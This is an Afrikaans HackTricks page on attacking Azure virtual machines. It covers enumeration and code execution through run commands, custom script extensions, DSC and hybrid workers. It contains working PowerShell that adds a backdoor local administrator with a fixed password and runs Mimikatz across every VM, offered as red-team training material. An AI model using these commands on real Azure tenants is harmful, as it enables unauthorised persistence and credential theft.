# Az - Virtuele Masjiene & Netwerk

{% hint style="success" %}
Leer & oefen AWS Hack:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Opleiding AWS Rooi Span Kenner (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Leer & oefen GCP Hack: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Opleiding GCP Rooi Span Kenner (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kontroleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacktruuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basiese inligting

[Van die dokumente:](https://learn.microsoft.com/en-us/azure/virtual-machines/overview) Azure virtuele masjiene is een van verskeie tipes [aanvraag, skaalbare rekenaarhulpbronne](https://learn.microsoft.com/en-us/azure/architecture/guide/technology-choices/compute-decision-tree) wat Azure bied. Gewoonlik kies jy 'n virtuele masjien wanneer jy meer beheer oor die rekenaaromgewing benodig as wat die ander keuses bied. Hierdie artikel gee jou inligting oor wat jy moet oorweeg voordat jy 'n virtuele masjien skep, hoe jy dit skep, en hoe jy dit bestuur.

## Azure Netwerk Inligting

Azure-netwerke bevat **verskillende entiteite en maniere om dit te konfigureer.** Jy kan 'n kort **beskrywings,** **voorbeelde** en **opsomming** opdragte van die verskillende Azure-netwerk entiteite vind in:

{% content-ref url="az-azure-network.md" %}
[az-azure-network.md](az-azure-network.md)
{% endcontent-ref %}

## Azure Bastion

**Azure Bastion** bied 'n veilige, ten volle bestuurde RDP (Remote Desktop Protocol) en SSH (Secure Shell) toegangsl√∂sing oor SSL deur die Azure-portaal. Dit is ge√Øntegreer binne 'n Azure Virtuele Netwerk, wat RDP en SSH konnektiwiteit na VM's met privaat IP's moontlik maak, sonder die nodigheid vir openbare IP's. Dit maak dit 'n veiliger, meer gerieflike alternatief vir tradisionele metodes wat openbare IP-toekennings en NSG-re√´lkonfigurasies vir VM-toegang betrek. Ontwikkelaars en IT-personeel kan veilig toegang verkry tot VM's vanaf die Azure-portaal deur hul webblaaier te gebruik, wat die proses vir ontwikkeling en toetsomgewings stroomlyn.

Om alle Azure Bastion-gashere in jou inskrywing te lys, kan jy die volgende opdrag gebruik:

{% code overflow="wrap" %}
```bash
az network bastion list --query "[].{name:name, resourceGroup:resourceGrou, location:location}" -o table
```
{% endcode %}

## VM Opsomming
```powershell
# Get readable VMs
Get-AzVM | fl
# Lis running VMs
Get-AzureRmVM -status | where {$_.PowerState -EQ "VM running"} | select ResourceGroupName,Name
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | fl *
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | select -ExpandProperty NetworkProfile

# Get iface and IP address
Get-AzNetworkInterface -Name <interface_name>
Get-AzPublicIpAddress -Name <iface_public_ip_id>

#Get installed extensions
Get-AzVMExtension -ResourceGroupName <res_group_name> -VMName <name>

Get-AzVM | select -ExpandProperty NetworkProfile # Get name of network connector of VM
Get-AzNetworkInterface -Name <name> # Get info of network connector (like IP)
```
## **Voer opdragte in 'n VM uit**

### **AAD-aanmelding in VM**

Dit is moontlik om toegang te verleen aan gebruikers wat ge√Ødentifiseer is via AzureAD. Byvoorbeeld, as jy probeer om toegang te kry tot 'n **linux VM**: `ssh username@azure-corp.com@1.1.1.1` (dit is belangrik om **die e-posadres** met die azurecorp te gebruik wat gebruik is tydens die aanmelding) kan jy 'n fout soos die volgende kry:
```
(username@azure-corp.com@1.1.1.1) This preview capability is not for production use. When you sign in, verify the name of the app on the sign-in screen is "Azure Linux VM Sign-in" and the IP address of the target VM is correct.

To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code DT4PNSTGR to authenticate. Press ENTER when ready.
```
{% endcode %}

Net **volg daardie instruksies** deur na [https://microsoft.com/devicelogin](https://microsoft.com/devicelogin) te gaan en die kode aan te dui, gebruik die e-pos en wagwoord as geloofsbriewe en jy sal in staat wees om via SSH te koppel (as daardie gebruiker genoeg regte het om dit te doen: `Virtual Machine Administrator Login` of `Virtual Machine User Login` rol).

### **Voer Opdrag Uit**
```powershell
# The permission allowing this is Microsoft.Compute/virtualMachines/runCommand/action
Invoke-AzVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' ‚ÄìVerbose
## Another way
Invoke-AzureRmVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' ‚ÄìVerbose

# Content of the script
$passwd = ConvertTo-SecureString "Welcome2022!" -AsPlainText -Force
New-LocalUser -Name new_user -Password $passwd
Add-LocalGroupMember -Group Administrators -Member new_user
```

```powershell
# Try to run in every machine
Import-module MicroBurst.psm1
Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
```
### **Voer Aangepaste Skripsie-uitbreiding uit**

Azure virtuele masjien (VM) uitbreidings is **klein toepassings** wat n√°-implementering konfigurasie en outomatisering **take** op **Azure VM's** voorsien. Byvoorbeeld, as 'n virtuele masjien sagteware-installasie, antivirusbeskerming, of die vermo√´ om 'n skripsie binne-in dit uit te voer, benodig, kan jy 'n VM-uitbreiding gebruik.

Daarom, as jy toegang het om dit te skryf, kan jy willekeurige kode uitvoer:
```powershell
# Microsoft.Compute/virtualMachines/extensions/write
Set-AzVMExtension -ResourceGroupName "Research" -ExtensionName "ExecCmd" -VMName "infradminsrv" -Location "Germany West Central" -Publisher Microsoft.Compute -ExtensionType CustomScriptExtension -TypeHandlerVersion 1.8 -SettingString '{"commandToExecute":"powershell net users new_user Welcome2022. /add /Y; net localgroup administrators new_user /add"}'
```
### GewensteKonfigurasieToestand (DSC)

GewensteKonfigurasieToestand (DSC) is 'n PowerShell-instrument soortgelyk aan Ansible, wat gebruik word om 'n gasheer deur kode op te stel. DSC integreer met Azure, wat die oplaai van spesifieke konfigurasie l√™ers moontlik maak. Hierdie l√™ers moet aan 'n streng sintaksis voldoen. Die DSC-uitbreiding in Azure kan bevele uitvoer van l√™ers wat aan sekere opmaakvereistes voldoen, selfs as die sintaksis nie korrek is vir DSC-standaarde nie, soos in die voorsiene figuur getoon.

Die uitvoering van hierdie bevele word gefasiliteer deur die [**`Publish-AzVMDscConfiguration`**](https://docs.microsoft.com/en-us/powershell/module/az.compute/publish-azvmdscconfiguration?view=azps-7.5.0) funksie in Az PowerShell. Die vereistes sluit in 'n **.PS1** l√™er met 'n gedefinieerde funksie en die l√™er moet in 'n **.zip** l√™er saamgepers word. Selfs al is die sintaksis nie akkuraat vir DSC nie, sal die kode steeds uitgevoer word. Die uitbreiding sal egter die uitvoerstatus as "mislukking" aandui, en geen uitset van die bevel sal sigbaar wees nie as gevolg van die status wat oorskryf word deur die mislukkingsboodskap.

### VM-toepassingsdefinisies

VM-toepassingsdefinisies maak die herhaalbare implementering van weergawes van toepassings na 'n Azure VM moontlik. Hierdie hulpbron ondersteun die implementering en opdatering van toepassings oor VM's. Om dit op te stel, is verskeie stappe nodig, wat bevele soos **`New-AzGalleryApplication`** en **`New-AzGalleryApplicationVersion`** in Az PowerShell insluit.

Die uitvoering van toepassings of bevele deur hierdie metode behels die **"VMAppExtension"**, wat outomaties ge√Ønstalleer word wanneer 'n toepassing op 'n VM toegepas word. Die uitbreiding haal die l√™er vanaf die gespesifiseerde URI en noem dit presies soos die toepassing, sonder 'n uitbreiding. Om die l√™er korrek uit te voer, moet die "ManageActions" veld in die REST API-oproep gekonfigureer word om die l√™er met die toepaslike uitbreiding te hernoem. Die opstel van hierdie metode, wanneer voltooi, sal lyk soos die struktuur wat in die voorsiene figuur getoon word.

Hierdie metode van uitvoering is egter relatief stadig en neem ongeveer 3-4 minute om 'n toepassing of bevel uit te voer. Die l√™ers wat met hierdie proses verband hou, word gestoor in spesifieke gids (`C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Downloads\` vir die toepassingskopie en `C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Status\` vir die uitvoeringsstatus).

Beide tegnieke bied unieke maniere om bevele uit te voer en toepassings in Azure-omgewings te implementeer, elk met sy eie stel vereistes, stappe en oorwegings.

### Hibriede Werker Groepe (HWGs) in Azure

[**Hibriede Werker Groepe (HWGs)**](https://docs.microsoft.com/en-us/azure/automation/automation-hybrid-runbook-worker) is 'n kenmerk in Azure wat hardloopboeke, wat in 'n Outomatiseringsrekening opgestel is, toelaat om op 'n Azure Virtuele Masjien (VM) wat deel is van die aangewese HWG, uitgevoer te word. Hierdie uitvoering word fasiliteer deur 'n uitbreiding wat op die VM ge√Ønstalleer is, wat die Hardloopboek-kode op die VM ontplooi. 'n Belangrike aspek van hierdie proses is dat die werklike geloofsbriewe nie 'n faktor in die uitvoering is nie omdat die kode met verhoogde voorregte loop, spesifiek as **SYSTEM** of root, soos ge√Øllustreer in die voorsiene figuur.

'N Belangrike detail vir diegene wat Windows 10 VM's gebruik, is die noodsaaklikheid om die PowerShell-weergawe vir die Hardloopboek te spesifiseer. Dit moet ingestel word om as PowerShell Weergawe 5.1 te loop in plaas van 7.1. Hierdie vereiste spruit voort uit die feit dat PowerShell 7.1 nie standaard op hierdie VM's ge√Ønstalleer is nie, wat tot 'n mislukking in skripsuitvoering lei as weergawe 7.1 gespesifiseer word.

Hierdie kenmerk van Azure bied 'n robuuste metode vir outomatisering en bestuur van take oor hibriede omgewings, wat sentrale bestuur en uitvoering van take op Azure VM's moontlik maak.


## Verwysings

* [https://learn.microsoft.com/en-us/azure/virtual-machines/overview](https://learn.microsoft.com/en-us/azure/virtual-machines/overview)
* [https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/](https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/)

{% hint style="success" %}
Leer & oefen AWS-hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Leer & oefen GCP-hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kontroleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
{% endhint %}
